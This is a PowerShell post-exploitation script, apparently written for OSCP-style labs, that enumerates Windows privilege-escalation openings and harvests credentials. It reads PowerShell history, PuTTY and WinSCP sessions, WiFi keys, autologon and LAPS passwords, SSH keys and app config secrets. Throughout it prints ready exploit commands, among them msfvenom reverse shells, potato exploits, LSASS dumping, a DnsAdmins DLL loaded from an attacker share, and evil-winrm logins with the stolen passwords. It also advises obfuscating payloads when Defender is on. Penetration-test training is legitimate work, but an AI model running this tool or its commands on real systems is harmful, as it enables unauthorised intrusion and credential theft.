# =============================================================================
# win-korek.ps1 - Privilege Escalation & Credential Enumeration
# Post-foothold local privilege escalation gap filler (pairs with winPEAS)
# Focused on OSCP: token privs, service misconfigs, credential recovery, AD
# Author: korek
# =============================================================================
# Usage:
#   . .\win-korek.ps1; Invoke-Korek
#   Invoke-Korek -OutputFile C:\Windows\Tasks\korek_out.txt
#   Invoke-Korek -Verbose
# =============================================================================

function Invoke-Korek {
    param(
        [string]$OutputFile = "",
        [switch]$Verbose = $false
    )

    $out      = [System.Collections.ArrayList]@()
    $findings = [System.Collections.ArrayList]@()

    function Log  { param([string]$m,[string]$c="White") ; Write-Host $m -ForegroundColor $c ; if($OutputFile){$out.Add($m)|Out-Null} }
    function Hit  { param([string]$m) ; Log "[+] $m" "Green"  ; $findings.Add("[+] $m")|Out-Null }
    function Hot  { param([string]$m) ; Log "[!!] $m" "Red"   ; $findings.Add("[!!] $m")|Out-Null }
    function Info { param([string]$m) ; Log "    >>> $m" "Gray" }
    function Sec  { param([string]$m) ; Log "`n[*] === $m ===" "Cyan" }
    function Expl { param([string]$m) ; Log "    [EXPLOIT] $m" "Yellow" }
    function DBG  { param([string]$m) ; if($Verbose){ Log "    [DBG] $m" "DarkGray" } }

    function Get-FileSafe {
        param([string]$p)
        try { if(Test-Path $p -EA Stop){ $f=Get-Item $p -EA Stop; if($f.Length -gt 0 -and -not $f.PSIsContainer){return $f} } } catch{}
        return $null
    }
    function Get-ContentSafe {
        param([string]$p,[int]$n=30)
        try { return Get-Content $p -EA Stop -TotalCount $n } catch { return $null }
    }
    function Get-Reg {
        param([string]$p,[string]$k)
        try { return (Get-ItemProperty $p -Name $k -EA Stop).$k } catch { return $null }
    }
    function Test-Writable {
        # Returns $true if current user can write to the given file or directory
        param([string]$path)
        try {
            if ([System.IO.Directory]::Exists($path)) {
                $tmp = [System.IO.Path]::Combine($path, [System.IO.Path]::GetRandomFileName())
                [System.IO.File]::WriteAllText($tmp, "t")
                Remove-Item $tmp -EA SilentlyContinue
                return $true
            } elseif ([System.IO.File]::Exists($path)) {
                $fs = [System.IO.File]::OpenWrite($path)
                $fs.Close()
                return $true
            }
        } catch {}
        return $false
    }

    Log "============================================================" "Cyan"
    Log "  win-korek.ps1 - PrivEsc & Cred Gap Filler" "Cyan"
    Log "  Token privs | Service misconfigs | Creds | AD" "Cyan"
    Log "  Run AFTER winPEAS for complete coverage" "Cyan"
    Log "============================================================" "Cyan"

    # ------------------------------------------------------------------
    # CONTEXT
    # ------------------------------------------------------------------
    Sec "CONTEXT"
    $whoami   = whoami
    $isAdmin  = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $isSystem = $whoami -eq "nt authority\system"
    $isDomain = -not ([string]::IsNullOrEmpty($env:USERDNSDOMAIN))
    Log "User: $whoami" "White"
    if ($isSystem) { Hot "Running as SYSTEM" }
    elseif ($isAdmin) { Hot "Running as ADMINISTRATOR" }
    else { Info "Standard user (UAC may block some checks)" }
    if ($isDomain) { Hit "Domain-joined: $env:USERDNSDOMAIN" } else { Info "Not domain-joined (standalone)" }

    # ------------------------------------------------------------------
    # TOKEN PRIVILEGES
    # ------------------------------------------------------------------
    Sec "TOKEN PRIVILEGES (potato / privesc decision)"
    try {
        $privs = whoami /priv /fo csv 2>$null | ConvertFrom-Csv
        $anyHot = $false
        $privs | ForEach-Object {
            $name  = $_."Privilege Name"
            $state = $_."State"
            if ($state -match "Enabled") {
                switch ($name) {
                    "SeImpersonatePrivilege"      { Hot "SeImpersonatePrivilege ENABLED -> JuicyPotato / GodPotato / PrintSpoofer"; Expl "GodPotato.exe -cmd 'cmd /c whoami'"; $anyHot=$true }
                    "SeAssignPrimaryTokenPrivilege" { Hot "SeAssignPrimaryTokenPrivilege ENABLED -> JuicyPotato"; Expl "JuicyPotatoNG.exe -t * -p cmd.exe"; $anyHot=$true }
                    "SeDebugPrivilege"            { Hot "SeDebugPrivilege ENABLED -> dump LSASS"; Expl "procdump.exe -ma lsass.exe lsass.dmp  OR  Task Manager dump"; $anyHot=$true }
                    "SeBackupPrivilege"           { Hot "SeBackupPrivilege ENABLED -> read SAM/SYSTEM/NTDS"; Expl "robocopy C:\Windows\System32\config C:\temp SAM SYSTEM /B"; $anyHot=$true }
                    "SeTakeOwnershipPrivilege"    { Hit "SeTakeOwnershipPrivilege ENABLED -> can take ownership of files" }
                    "SeLoadDriverPrivilege"       { Hot "SeLoadDriverPrivilege ENABLED -> arbitrary kernel code"; Expl "EopLoadDriver + vulnerable driver"; $anyHot=$true }
                    "SeRestorePrivilege"          { Hit "SeRestorePrivilege ENABLED -> can write arbitrary files" }
                    "SeCreateSymbolicLinkPrivilege" { Hit "SeCreateSymbolicLinkPrivilege ENABLED -> symlink attacks" }
                }
            }
        }
        if (-not $anyHot) { Info "No high-value token privileges - focus on service / cred checks below" }
    } catch { DBG "whoami /priv failed: $_" }

    # ------------------------------------------------------------------
    # AV / DEFENDER STATE
    # ------------------------------------------------------------------
    Sec "ANTIVIRUS AND DEFENDER STATE"
    try {
        $def = Get-MpComputerStatus -EA SilentlyContinue
        if ($def) {
            if ($def.RealTimeProtectionEnabled) { Hit "Defender RealTime ON - obfuscate payloads" }
            else { Info "Defender RealTime DISABLED - payload delivery easier" }
            Info "IsTamperProtected: $($def.IsTamperProtected)"
        } else { Info "Cannot query Defender status" }
    } catch { DBG "Get-MpComputerStatus error: $_" }

    # ------------------------------------------------------------------
    # WRITABLE SERVICE BINARIES (only report confirmed-writable)
    # ------------------------------------------------------------------
    Sec "WRITABLE SERVICE BINARIES (confirmed writable only)"
    try {
        $svcCount = 0
        Get-WmiObject Win32_Service -EA SilentlyContinue |
        Where-Object { $_.PathName -ne $null } |
        ForEach-Object {
            $svc  = $_
            $raw = $svc.PathName.Trim()
            if ($raw.StartsWith('"')) { $path = $raw.Substring(1).Split('"')[0] }
            else { $path = $raw.Split(' ')[0] }
            if (-not (Test-Path $path -EA SilentlyContinue)) { return }
            if (Test-Writable $path) {
                Hot "WRITABLE SERVICE BINARY: '$($svc.Name)' -> $path"
                Info "Runs as: $($svc.StartName)"
                Expl "cp malicious.exe '$path' ; Restart-Service $($svc.Name)"
                $svcCount++
            } else {
                DBG "Not writable (skipped): $path"
            }
        }
        if ($svcCount -eq 0) { Info "No writable service binaries found" }
    } catch { DBG "Service binary check error: $_" }

    # ------------------------------------------------------------------
    # UNQUOTED SERVICE PATHS (only report if exploit path is writable)
    # ------------------------------------------------------------------
    Sec "UNQUOTED SERVICE PATHS (confirmed writable exploit path only)"
    try {
        $uqCount = 0
        Get-WmiObject Win32_Service -EA SilentlyContinue |
        Where-Object {
            $_.PathName -notmatch '"' -and
            $_.PathName -match ' ' -and
            $_.PathName -notmatch "^C:\\Windows" -and
            $_.PathName -ne $null
        } | ForEach-Object {
            $svc  = $_
            $raw  = $svc.PathName.Trim()
            # build candidate exploit paths (e.g. C:\Program.exe, C:\Program Files\App.exe)
            $parts = $raw -split '\s+'
            $candidates = @()
            $built = ""
            foreach ($part in $parts) {
                if ($built -eq "") { $built = $part } else { $built += " $part" }
                if ($built -match "\.exe$") { break }
                $candidates += "$built.exe"
            }

            $exploitable = $false
            foreach ($c in $candidates) {
                $dir = Split-Path $c -Parent
                if ((Test-Path $dir -EA SilentlyContinue) -and (Test-Writable $dir)) {
                    Hot "EXPLOITABLE UNQUOTED PATH: '$($svc.Name)'"
                    Info "Service path: $raw"
                    Info "Runs as: $($svc.StartName)"
                    Hot "Place malicious exe at: $c"
                    Expl "msfvenom -p windows/x64/shell_reverse_tcp ... -f exe -o '$c'"
                    Expl "Restart-Service $($svc.Name)  OR  sc.exe stop/start $($svc.Name)"
                    $exploitable = $true
                    $uqCount++
                    break
                }
            }
            if (-not $exploitable) {
                DBG "Unquoted but no writable path (skipped): $raw"
            }
        }
        if ($uqCount -eq 0) { Info "No exploitable unquoted paths (write-verified)" }
    } catch { DBG "Unquoted path check error: $_" }

    # ------------------------------------------------------------------
    # WRITABLE PATH DIRECTORIES (DLL hijacking)
    # ------------------------------------------------------------------
    Sec "WRITABLE PATH DIRECTORIES (DLL hijack - confirmed writable only)"
    $pathCount = 0
    $env:PATH -split ';' | Where-Object { $_ -ne "" } | ForEach-Object {
        $dir = $_.Trim()
        if ((Test-Path $dir -EA SilentlyContinue) -and (Test-Writable $dir)) {
            Hot "WRITABLE PATH DIR: $dir"
            Expl "Drop malicious DLL here - processes loading from PATH will pick it up"
            $pathCount++
        } else {
            DBG "PATH dir not writable (skipped): $dir"
        }
    }
    if ($pathCount -eq 0) { Info "No writable PATH directories found" }

    # ------------------------------------------------------------------
    # SCHEDULED TASKS (SYSTEM/HIGH - writable binary only)
    # ------------------------------------------------------------------
    Sec "SCHEDULED TASKS (SYSTEM/HIGH - writable binary only)"
    try {
        $taskCount = 0
        Get-ScheduledTask -EA SilentlyContinue |
        Where-Object { $_.Principal.UserId -match "SYSTEM|S-1-5-18" -or $_.Principal.RunLevel -eq "Highest" } |
        ForEach-Object {
            $task = $_
            try {
                $action = $task.Actions[0]
                if ($action -and $action.Execute) {
                    $exe = $action.Execute
                    if ((Test-Path $exe -EA SilentlyContinue) -and (Test-Writable $exe)) {
                        Hot "WRITABLE TASK BINARY: '$($task.TaskName)' -> $exe"
                        Info "RunLevel: $($task.Principal.RunLevel) | User: $($task.Principal.UserId)"
                        Expl "Replace $exe with malicious binary and wait for task to run"
                        $taskCount++
                    } else {
                        # Also check if the script/argument file is writable
                        $arg = $action.Arguments
                        if ($arg -match '([A-Za-z]:\\[^\s]+\.(ps1|bat|cmd|vbs))') {
                            $scriptPath = $Matches[1]
                            if ((Test-Path $scriptPath -EA SilentlyContinue) -and (Test-Writable $scriptPath)) {
                                Hot "WRITABLE TASK SCRIPT: '$($task.TaskName)' -> $scriptPath"
                                Info "Runs as: $($task.Principal.UserId)"
                                Expl "Overwrite $scriptPath with malicious code"
                                $taskCount++
                            }
                        }
                        DBG "Task '$($task.TaskName)' not writable (skipped)"
                    }
                }
            } catch {}
        }
        if ($taskCount -eq 0) { Info "No writable scheduled task binaries/scripts found" }
    } catch { DBG "Scheduled task check error: $_" }

    # ------------------------------------------------------------------
    # SAM / SYSTEM / NTDS BACKUPS
    # ------------------------------------------------------------------
    Sec "SAM / SYSTEM / NTDS BACKUPS"
    @(
        "C:\Windows\System32\config\RegBack\SAM",
        "C:\Windows\System32\config\RegBack\SYSTEM",
        "C:\Windows\System32\config\RegBack\SECURITY",
        "C:\windows.old\Windows\System32\SAM",
        "C:\windows.old\Windows\System32\SYSTEM",
        "C:\windows.old\Windows\System32\SECURITY",
        "C:\windows.old\Windows\System32\config\SAM",
        "C:\windows.old\Windows\System32\config\SYSTEM",
        "C:\windows.old\Windows\System32\config\SECURITY",
        "C:\Windows\NTDS\ntds.dit"
    ) | ForEach-Object {
        $f = Get-FileSafe $_
        if ($f) {
            Hot "$_ ($($f.Length) bytes)"
            Expl "download then: impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
        }
    }

    # ------------------------------------------------------------------
    # POWERSHELL HISTORY
    # ------------------------------------------------------------------
    Sec "POWERSHELL HISTORY"
    try {
        Get-Item "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -EA SilentlyContinue |
        Where-Object { $_.Length -gt 0 } | ForEach-Object {
            Hit "History: $($_.FullName)"
            $content = Get-ContentSafe $_.FullName 500
            # print all lines
            $content | ForEach-Object { Info ">> $_" }
            # highlight credential lines
            $content | Where-Object {
                $_ -match "(?i)(password|passwd|pwd|cred|secret|token|-pw\s|net use|runas|Start-Process.*-cred|invoke.*-pass)" -and
                $_ -notmatch "^#"
            } | ForEach-Object {
                Hot "CRED LINE: $_"
                if ($_ -match "-pw\s+'?([^'\s]+)'?") { Hot "PASSWORD: $($Matches[1])" }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # PUTTY / WINSCP SAVED SESSIONS
    # ------------------------------------------------------------------
    Sec "PUTTY / WINSCP SAVED SESSIONS"
    try {
        $puttyBase = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
        if (Test-Path $puttyBase -EA SilentlyContinue) {
            # Method 1: standard subkeys
            Get-ChildItem $puttyBase -EA SilentlyContinue | ForEach-Object {
                $name = $_.PSChildName
                $h = Get-Reg $_.PSPath "HostName"
                $u = Get-Reg $_.PSPath "UserName"
                if ($h) {
                    Hit "PuTTY subkey session: $name -> $u@$h"
                    Expl "Try: ssh $u@$h"
                }
                # grep values inside subkey for -pw
                try {
                    Get-ItemProperty $_.PSPath -EA Stop |
                    Select-Object -Property * -ExcludeProperty PS* |
                    Get-Member -MemberType NoteProperty -EA SilentlyContinue | ForEach-Object {
                        $val = (Get-ItemProperty "$puttyBase\$name" -EA SilentlyContinue).$($_.Name)
                        if ($val -match "-pw\s+'?([^'\s]+)'?") {
                            Hot "PASSWORD IN PUTTY SUBKEY VALUE: $($Matches[1])"
                            if ($val -match "(\w+)@([\d\.a-zA-Z]+)") { Info "User@Host: $($Matches[0])" }
                            Expl "Try: ssh $($Matches[0]) -p extracted_password"
                        }
                    }
                } catch {}
            }
            # Method 2: values stored DIRECTLY on Sessions key (non-standard, e.g. zachary box)
            try {
                $directVals = Get-ItemProperty $puttyBase -EA Stop
                $directVals.PSObject.Properties |
                Where-Object { $_.Name -notmatch "^PS" } |
                ForEach-Object {
                    $val = $_.Value
                    if ($val -match "-pw\s+'?([^'\s]+)'?") {
                        Hot "PUTTY DIRECT SESSION CRED: $($_.Name) = $val"
                        Hot "PASSWORD EXTRACTED: $($Matches[1])"
                        if ($val -match "(\w+)@([\d\.a-zA-Z]+)") { Info "User@Host: $($Matches[0])" }
                        Expl "ssh or use extracted password directly"
                    }
                }
            } catch {}
        } else { Info "No PuTTY sessions found" }
    } catch {}

    try {
        Get-ChildItem "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions" -EA SilentlyContinue | ForEach-Object {
            $h = Get-Reg $_.PSPath "HostName"
            $u = Get-Reg $_.PSPath "UserName"
            $p = Get-Reg $_.PSPath "Password"
            if ($h) {
                Hot "WinSCP session: $($_.PSChildName) -> $u@$h"
                if ($p) { Info "Obfuscated password: $p" }
                Expl "Decrypt: python3 winscppasswd.py $h $u $p"
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # WIFI PASSWORDS
    # ------------------------------------------------------------------
    Sec "WIFI PASSWORDS"
    try {
        netsh wlan show profiles 2>$null | Select-String "Profile\s*:\s*(.+)" | ForEach-Object {
            $n = $_.Matches.Groups[1].Value.Trim()
            $k = netsh wlan show profile name="$n" key=clear 2>$null | Select-String "Key Content\s*:\s*(.+)"
            if ($k) { Hot "WiFi '$n': $($k.Matches.Groups[1].Value.Trim())" }
        }
    } catch {}

    # ------------------------------------------------------------------
    # AUTOLOGON CREDENTIALS
    # ------------------------------------------------------------------
    Sec "AUTOLOGON CREDENTIALS"
    $autoUser = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultUserName"
    $autoPass = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultPassword"
    $autoDom  = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultDomainName"
    if ($autoPass) {
        Hot "AUTOLOGON CREDENTIALS FOUND!"
        Info "Domain: $autoDom | User: $autoUser | Pass: $autoPass"
        Expl "evil-winrm -i TARGET -u '$autoUser' -p '$autoPass'"
        Expl "nxc smb TARGET -u '$autoUser' -p '$autoPass' --local-auth"
    } else { Info "No autologon credentials" }

    # ------------------------------------------------------------------
    # CREDENTIAL MANAGER
    # ------------------------------------------------------------------
    Sec "CREDENTIAL MANAGER"
    try {
        $creds = cmdkey /list 2>$null
        $creds | Where-Object { $_ -match "Target|User" } | ForEach-Object {
            Hit "Stored credential: $_"
            Expl "runas /savecred /user:DOMAIN\USER cmd.exe"
        }
    } catch {}

    # ------------------------------------------------------------------
    # SSH PRIVATE KEYS
    # ------------------------------------------------------------------
    Sec "SSH PRIVATE KEYS"
    @("C:\Users\*\.ssh\","C:\Users\*\Documents\","C:\Users\*\Desktop\","C:\ProgramData\") | ForEach-Object {
        try {
            Get-ChildItem $_ -EA SilentlyContinue | Where-Object {
                $_.Name -match "^(id_rsa|id_dsa|id_ecdsa|id_ed25519)$|\.pem$|\.ppk$" -and $_.Length -gt 0
            } | ForEach-Object {
                Hot "SSH Key: $($_.FullName)"
                $c = Get-ContentSafe $_.FullName 3
                if ($c -match "PRIVATE") { Info "Contains PRIVATE KEY" }
                Expl "Transfer to Kali: ssh -i keyfile user@target"
            }
        } catch {}
    }

    # ------------------------------------------------------------------
    # KEEPASS / PASSWORD FILES
    # ------------------------------------------------------------------
    Sec "KEEPASS / PASSWORD FILES"
    try {
        Get-ChildItem C:\ -Recurse -Depth 6 -EA SilentlyContinue |
        Where-Object { $_.Name -match "\.kdbx$|\.kdb$|^pass.*\.txt$|^cred.*\.txt$" -and $_.Length -gt 0 } |
        ForEach-Object {
            Hot "Password file: $($_.FullName) ($($_.Length) bytes)"
            Expl "keepass2john file.kdbx | hashcat -m 13400"
        }
    } catch {}

    # ------------------------------------------------------------------
    # STICKY NOTES
    # ------------------------------------------------------------------
    Sec "STICKY NOTES"
    try {
        Get-Item "C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite" -EA SilentlyContinue |
        Where-Object { $_.Length -gt 0 } | ForEach-Object {
            Hot "Sticky Notes DB: $($_.FullName)"
            Expl "sqlite3 plum.sqlite 'SELECT Text FROM Note;'"
        }
    } catch {}

    # ------------------------------------------------------------------
    # GPP PASSWORDS
    # ------------------------------------------------------------------
    Sec "GPP PASSWORDS IN SYSVOL (AD)"
    if ($isDomain) {
        Info "GPP check is AD-specific - use easyAD.ps1 for full coverage"
        Info "Download: https://github.com/saitamang/easyAD"
        Expl ". .\easyAD.ps1   # covers GPP + all AD attack paths"
        Info "Quick manual check:"
        Expl "findstr /S /I cpassword \\$env:USERDNSDOMAIN\sysvol\$env:USERDNSDOMAIN\policies\*.xml"
        Expl "gpp-decrypt <cpassword_value>   # on Kali after extracting value"
    } else { Info "Not domain-joined; skipped" }

    # ------------------------------------------------------------------
    # APP CONFIG FILES
    # ------------------------------------------------------------------
    Sec "APP CONFIG FILES WITH CREDENTIALS"
    @("C:\wamp","C:\wamp64","C:\xampp","C:\inetpub","C:\tomcat","C:\Users","C:\Program Files","C:\Program Files (x86)") | ForEach-Object {
        if (Test-Path $_ -EA SilentlyContinue) {
            try {
                Get-ChildItem $_ -Recurse -Depth 5 -EA SilentlyContinue |
                Where-Object {
                    $_.Name -match "web\.config|\.env|config\.php|wp-config\.php|database\.yml|appsettings\.json|tomcat-users\.xml|config\.ini" -and
                    $_.Length -gt 0 -and -not $_.PSIsContainer
                } | ForEach-Object {
                    Hit "Config: $($_.FullName)"
                    Get-ContentSafe $_.FullName 30 |
                    Where-Object { $_ -match "(?i)(pass|password|pwd|secret|key|token|user|connection)" -and $_ -notmatch "^#|^//" } |
                    Select-Object -First 5 | ForEach-Object { Info ">> $($_.Trim())" }
                }
            } catch {}
        }
    }

    # ------------------------------------------------------------------
    # SERVICES RUNNING AS DOMAIN USERS
    # ------------------------------------------------------------------
    Sec "SERVICES RUNNING AS DOMAIN USERS"
    if ($isDomain) {
        try {
            $domSvcs = Get-WmiObject Win32_Service -EA SilentlyContinue |
            Where-Object {
                $_.StartName -notmatch "LocalSystem|LocalService|NetworkService|NT AUTHORITY|NT SERVICE" -and
                $_.StartName -ne $null -and $_.StartName -ne ""
            }
            if ($domSvcs) {
                $domSvcs | ForEach-Object {
                    Hit "Service '$($_.Name)' runs as: $($_.StartName)"
                    Info "Binary: $($_.PathName)"
                    Info "If you crack or own this account -> service binary is a privesc target"
                }
            } else {
                Info "No services running as domain users"
            }
        } catch { DBG "Service domain user check failed: $_" }
        Info "For full AD lateral movement paths run easyAD.ps1:"
        Info "  Download: https://github.com/saitamang/easyAD"
        Expl ". .\easyAD.ps1"
    } else { Info "Not domain-joined; skipped" }

    # ------------------------------------------------------------------
    # LAPS
    # ------------------------------------------------------------------
    Sec "LAPS SECRETS (AD)"
    if ($isDomain) {
        try {
            $searcher = [ADSISearcher]"(ms-Mcs-AdmPwd=*)"
            $results  = $searcher.FindAll()
            if ($results.Count -gt 0) {
                $results | ForEach-Object {
                    $pass = $_.Properties["ms-Mcs-AdmPwd"][0]
                    $comp = $_.Properties["name"][0]
                    Hot "LAPS PASSWORD for $comp : $pass"
                    Expl "evil-winrm -i $comp -u Administrator -p '$pass'"
                }
            } else {
                Info "LAPS not readable (or not configured) from this account"
                Info "For deeper AD enumeration including LAPS run easyAD.ps1:"
                Info "  Download: https://github.com/saitamang/easyAD"
                Expl ". .\easyAD.ps1"
                Expl "nxc ldap DC_IP -u USER -p PASS --laps   # from Kali via easyAD.sh"
            }
        } catch { Info "LAPS check failed (expected if no permissions)" }
    } else { Info "Not domain-joined; skipped" }

    # ------------------------------------------------------------------
    # ALWAYSINSTALLELEVATED
    # ------------------------------------------------------------------
    Sec "ALWAYSINSTALLELEVATED"
    $aie1 = Get-Reg "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
    $aie2 = Get-Reg "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
    if ($aie1 -eq 1 -and $aie2 -eq 1) {
        Hot "AlwaysInstallElevated ENABLED -> MSI privesc"
        Expl "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi"
        Expl "msiexec /quiet /qn /i shell.msi"
    } else { Info "AlwaysInstallElevated not enabled" }

    # ------------------------------------------------------------------
    # DNSADMINS (AD DC privesc)
    # ------------------------------------------------------------------
    Sec "DNSADMINS (instant SYSTEM on DC)"
    if ($isDomain) {
        try {
            $groups = whoami /groups 2>$null
            if ($groups -match "DnsAdmins") {
                Hot "USER IS IN DNSADMINS -> SYSTEM on DC!"
                Expl "dnscmd $env:USERDNSDOMAIN /config /serverlevelplugindll \\ATTACKER\share\malicious.dll"
                Expl "sc.exe \\DC stop dns"
                Expl "sc.exe \\DC start dns"
                Info "easyAD.ps1 covers full AD privesc paths including DnsAdmins:"
                Info "  Download: https://github.com/saitamang/easyAD"
            } else {
                Info "Not in DnsAdmins"
                Info "Run easyAD.ps1 for full AD group/ACL enumeration:"
                Info "  Download: https://github.com/saitamang/easyAD"
                Expl ". .\easyAD.ps1"
            }
        } catch { DBG "DnsAdmins check failed: $_" }
    } else { Info "Not domain-joined; skipped" }

    # ------------------------------------------------------------------
    # REGISTRY CREDENTIAL SEARCH
    # ------------------------------------------------------------------
    Sec "REGISTRY CREDENTIAL SEARCH"
    @(
        "HKLM:\SOFTWARE\ORL\WinVNC3\Password",
        "HKLM:\SOFTWARE\RealVNC\WinVNC4",
        "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities",
        "HKCU:\SOFTWARE\TightVNC\Server",
        "HKLM:\SOFTWARE\TightVNC\Server"
    ) | ForEach-Object {
        if (Test-Path $_ -EA SilentlyContinue) {
            Hot "Registry creds at: $_"
            Get-ItemProperty $_ -EA SilentlyContinue | ForEach-Object {
                $_.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } |
                ForEach-Object { Info "$($_.Name) = $($_.Value)" }
            }
        }
    }

    # ------------------------------------------------------------------
    # NETWORK INTERFACES (pivot check)
    # ------------------------------------------------------------------
    Sec "NETWORK INTERFACES (pivot opportunities)"
    try {
        Get-NetIPAddress -EA SilentlyContinue |
        Where-Object { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1" } |
        ForEach-Object {
            Hit "Interface: $($_.InterfaceAlias) -> $($_.IPAddress)/$($_.PrefixLength)"
            $myNet     = ($_.IPAddress -split '\.')[0..2] -join '.'
            $scanNet   = $myNet + ".0/" + $_.PrefixLength
            Info "Subnet: $scanNet"
            Expl "Pivot: ligolo / chisel / ssh -L to reach $scanNet"
        }
    } catch {}

    # ------------------------------------------------------------------
    # RECENTLY ACCESSED FILES
    # ------------------------------------------------------------------
    Sec "RECENTLY ACCESSED FILES"
    try {
        Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\" -EA SilentlyContinue |
        Sort-Object LastWriteTime -Descending | Select-Object -First 20 |
        ForEach-Object { Info "Recent: $($_.Name) ($($_.LastWriteTime))" }
    } catch {}

    # ------------------------------------------------------------------
    # INTERESTING FILES
    # ------------------------------------------------------------------
    Sec "INTERESTING FILES (proof, flag, cred, note)"
    try {
        Get-ChildItem "C:\Users\" -Recurse -EA SilentlyContinue |
        Where-Object {
            $_.Name -match "(?i)(proof|flag|pass|cred|secret|key|todo|note|local\.txt|proof\.txt)" -and
            -not $_.PSIsContainer -and $_.Length -gt 0
        } | ForEach-Object {
            Hit "Interesting: $($_.FullName)"
            if ($_.Extension -match "txt|ini|xml|config|log") {
                Get-ContentSafe $_.FullName 10 | ForEach-Object { Info ">> $_" }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # PRIORITY FINDINGS SUMMARY
    # ------------------------------------------------------------------
    Sec "PRIORITY FINDINGS SUMMARY (act on [!!] first)"
    if ($findings.Count -gt 0) {
        $findings | Select-Object -Unique | ForEach-Object { Log $_ }
    } else {
        Info "No critical findings - try service misconfigs, unquoted paths, or scheduled tasks"
    }

    # ------------------------------------------------------------------
    # OUTPUT
    # ------------------------------------------------------------------
    if ($OutputFile) {
        try { $out | Out-File $OutputFile -Encoding UTF8 ; Hit "Saved: $OutputFile" }
        catch { Log "[-] Could not save: $_" "Red" }
    }

    Log "`n[+] Done!" "Green"
    Log "    [!!] = Critical (act now)" "Red"
    Log "    [+]  = High value finding" "Green"
    Log "    [EXPLOIT] = Exact exploit command" "Yellow"
}
